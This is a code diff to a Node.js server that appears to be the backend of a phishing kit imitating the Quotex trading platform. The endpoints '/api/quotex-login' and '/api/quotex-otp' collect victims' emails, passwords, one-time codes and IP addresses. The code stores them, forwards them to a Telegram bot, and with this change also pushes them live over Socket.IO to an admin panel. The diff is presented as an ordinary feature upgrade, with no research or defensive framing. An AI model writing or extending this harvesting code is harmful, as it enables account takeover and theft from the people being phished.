@@ -25,20 +25,22 @@ async function sendTelegramMessage(text) {
     }
 }
 
-// ================== STORAGE FOR ADMIN PANEL (Fixed) ==================
-let loginLogs = [];   // Prevent duplicates
-let otpLogs = [];     // Prevent duplicates
-let users = [];       // All users
+// ================== NEW: SOCKET.IO SETUP ==================
+const http = require('http');
+const server = http.createServer(app);
+const { Server } = require("socket.io");
+const io = new Server(server, {
+    cors: { origin: "*" }
+});
 
-// Helper to prevent duplicate credentials
-function isDuplicate(type, identifier, value) {
-    if (type === 'login') {
-        return loginLogs.some(log => log.email === value);
-    }
-    if (type === 'otp') {
-        return otpLogs.some(log => log.email === identifier && log.otp === value);
-    }
-    return false;
+// ================== STORAGE FOR ADMIN PANEL (Enhanced) ==================
+let loginLogs = [];
+let otpLogs = [];
+let users = [];
+
+// Helper to prevent duplicates
+function findUserByKey(licenceKey) {
+    return users.find(u => u.licenceKey === licenceKey);
 }
 
 // ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
@@ -127,8 +129,9 @@ app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
 
-    // Prevent duplicate login entries
-    if (!isDuplicate('login', null, email)) {
+    // NEW: Prevent duplicate login
+    const existing = loginLogs.find(l => l.email === email);
+    if (!existing) {
         loginLogs.unshift({
             name: name || "User",
             email: email,
@@ -145,6 +148,10 @@ app.post('/api/quotex-login', async (req, res) => {
 ⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>
     `.trim();
     await sendTelegramMessage(message);
+
+    // NEW: Emit real-time event
+    io.emit('new_login', { name: name || "User", email });
+
     res.status(200).send({ status: "ok" });
 });
 
@@ -152,8 +159,9 @@ app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp, name } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
 
-    // Prevent duplicate OTP entries
-    if (!isDuplicate('otp', email, otp)) {
+    // NEW: Prevent duplicate OTP
+    const existing = otpLogs.find(l => l.email === email && l.otp === otp);
+    if (!existing) {
         otpLogs.unshift({
             name: name || "User",
             email: email,
@@ -163,10 +171,14 @@ app.post('/api/quotex-otp', async (req, res) => {
     }
 
     await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
+
+    // NEW: Emit real-time event
+    io.emit('new_otp', { name: name || "User", otp });
+
     res.status(200).send({ status: "ok" });
 });
 
-// ================== ADMIN PANEL ROUTES (FIXED) ==================
+// ================== ADMIN PANEL ROUTES ==================
 app.get('/api/latest-activity', (req, res) => {
     res.json({
         logins: loginLogs,
@@ -184,6 +196,6 @@ app.get('/', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+server.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
